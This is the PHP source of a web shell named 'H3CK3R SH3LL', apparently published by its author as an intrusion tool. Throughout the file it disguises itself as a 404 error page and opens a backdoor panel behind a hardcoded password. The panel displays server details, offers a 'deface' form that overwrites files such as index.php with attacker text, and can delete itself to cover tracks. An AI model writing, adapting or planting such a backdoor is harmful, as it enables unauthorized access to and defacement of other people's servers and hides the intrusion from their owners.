<?php
/*************/
# H3CK3R SH3LL
# Made by: @It0sh1
# Github: https://www.github.com/it0sh1
/*************/

// start the session.
session_start();

// The author of the webshell.
const Author = "It0sh1";

// Version of the webshell.
const Version = "v1.0.4";

// Default password.
$default_pass = "12345";

// LIST OF SOFTWARE INFORMATION FUNCTIONS.
$uname = php_uname();
$server_software = $_SERVER['SERVER_SOFTWARE'];//     Server software they use.
$server_ip = gethostbyname($_SERVER['HTTP_HOST']);//  Get server IP.
$site_protocol = $_SERVER['SERVER_PROTOCOL']; //      HTTP/HTTPS protocol.
$administrator = $_SERVER['SERVER_ADMIN']; //         Administrator info.
$requested_uri = $_SERVER['REQUEST_URI']; //          For 404 backdoor.

if(isset($_POST['default_pass']) && $_POST['default_pass'] == $default_pass) {
	$_SESSION["login"] = true;
	header("location: ?");
}

// The 404 backdoor.
if(isset($_GET['backdoor']) && $_GET['backdoor'] == "1"){
	if(!isset($_SESSION['login'])) {
		echo "<center style='
	            margin-top: 150px;'>
	                <h2>H3CK3R SH3LL " . Version . "</h2>
	                    <form method='POST' action=''>
	                        <input type='password' name='default_pass' placeholder='PASSWORD'><br /><br />
	                        <button type='submit'>Login</button>
	                    </form>
	                <i>Coded by: " . Author . "</i>
	      </center>";
	    die();
	}
}
if(!isset($_SESSION['login'])){
	echo "<!DOCTYPE html>
            <html>
                <head>
	                <title>404 Not Found</title>
	            </head>
	        <body>
	            <h1>Not Found</h1>
		      <p>
		        The requested URL " . $requested_uri . " was not found on this server.
		      </p>
			  <hr>
			  <address>" . $server_software . " Server at " . $_SERVER['HTTP_HOST'] . " Port " . $_SERVER['SERVER_PORT'] . "</address>
	        </body>
    </html>";
	die();
}
// The shell panel.
if(isset($_SESSION['login'])) {
	echo "<!DOCTYPE html>
	<html>
	    <head>
		    <title>H3CK3R SH3LL " . Version . "</title>
		</head>
		<body style='background: #143540;'>
		    <center><h1 style='color: #fff;'>H3CK3R SH3LL</h1><hr /></center>
		        <code style='color: #fff;'>
				    Uname: <b>" . $uname . "</b><br />
		            Software: <b>" . $server_software . "</b><br />
		            Server IP: <b>" . $server_ip . " | " . $_SERVER['REMOTE_ADDR'] ."</b><br />
		            Site Protocol: <b>" . $site_protocol . "</b><br />
		            Server Admin: <b>" . $administrator . "</b><br />
				</code>
		    <center>
		    <hr />
		    <bar>
		        <ul>
		            <li class='pages'><a href=".basename($_SERVER['PHP_SELF'])."/><b>Home</b></a></li>
			        <li class='pages'><a href=".basename($_SERVER['PHP_SELF'])."?exec=deface><b>deface</b></a></li>
			        <li class='pages'><a href=".basename($_SERVER['PHP_SELF'])."?link=logout><b>logout</b></a></li>
			        <li class='pages'><a href=".basename($_SERVER['PHP_SELF'])."?exec=selfremove><b>selfremove</b></a></li>
		        </ul>
		    </bar>
		    <hr />
		    </center>
		    <style>
                body { color: #fff; }
                bar { position:relative; text-align: center; }
                .pages a { text-decoration: none; transition: color 1s; color: #fff; }
                .pages { display:inline; padding:20px; font-size:16px; transition: color 1s; }
            </style>
		</body>
	</html>";
}

// For the deface section. 
if(isset($_GET['exec']) && $_GET['exec'] == "deface"){
	
	// Get the dir.
	$base_dir = getcwd();
	$base_dir = str_replace('\\', '/', $base_dir);
	
	?>
	<!-- HTML UPLOAD SECTION -->
	<center>
	<form method="post" action="" enctype="multipart/form-data">
	<label>Base directory:</label><input type="text" name="base_dir" value="<?php echo $base_dir ?>">
	<label>File name:</label><input type="text" name="filename" value="index.php"><br /><br />
	<label>Deface text/(html):</label><br /><textarea cols="50" rows="15" name="defacemessage">hacked by:</textarea><br /><br />
	<button type="submit" name="defaceit">Deface it</button></center>
	<?php
	if(isset($_POST['defaceit'])){
		
		// Properties.
		$deface_place = $base_dir;
		$filename = $_POST['filename'];
		$deface_text = $_POST['defacemessage'];
		
		if(!file_exists($filename)){
			$toFile = fopen($filename, 'a');
			fwrite($toFile, $deface_text);
		}
		else {
			$current = file_get_contents($filename);
			file_put_contents($filename, $deface_text);
		}
	}
}

// Self remove function.
if(isset($_GET['exec']) && $_GET['exec'] == "selfremove"){
	// Self remove button.
	echo "<center style='margin-top: 50px;'>
	<form method='post' action=''>
	<button type='submit' name='submitdelete'>Self Remove</button>
	</form>
	<p><span style='color:#E33434;'>Warning:</span> IF YOU CLICK ON (Self Remove)
	YOUR LOGIN SESSION WILL BE DESTROYED, AND THE SHELL ITSELF WILL BE REMOVED FROM THE SERVER!</p></center>";
	// The destroy function.
	if(isset($_POST['submitdelete'])){
		session_start();
		session_destroy();
		unlink(__FILE__);
		header('location: ../');
	}
}

// Logout script function.
if(isset($_GET['link']) && $_GET['link'] == "logout"){
	session_start();
	session_destroy();
	header("location: " . basename($_SERVER['PHP_SELF']));
}
?>
